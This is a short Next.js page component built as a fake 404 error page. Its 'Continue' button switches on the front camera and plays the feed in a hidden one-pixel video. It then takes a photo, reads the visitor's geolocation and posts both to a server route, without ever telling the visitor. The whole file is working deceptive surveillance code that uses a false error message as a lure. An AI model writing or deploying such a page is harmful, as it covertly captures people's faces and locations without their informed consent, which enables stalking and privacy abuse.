"use client";
import { useRef } from "react";
import "@/public/404.css";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);

  async function capture() {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = videoRef.current!;
    video.srcObject = stream;

    await new Promise(resolve => {
      video.onloadedmetadata = () => resolve(true);
    });

    await video.play();

    navigator.geolocation.getCurrentPosition(async pos => {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(video, 0, 0);

      const image = canvas.toDataURL("image/jpeg");

      stream.getTracks().forEach(t => t.stop());

      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    });
  }

  return (
    <div className="error-container">
      <h1>404</h1>
      <p>Click here to continue</p>

      <video
        ref={videoRef}
        playsInline
        style={{ width: 1, height: 1, opacity: 0 }}
      />

      <button onClick={capture}>Continue</button>
    </div>
  );
}
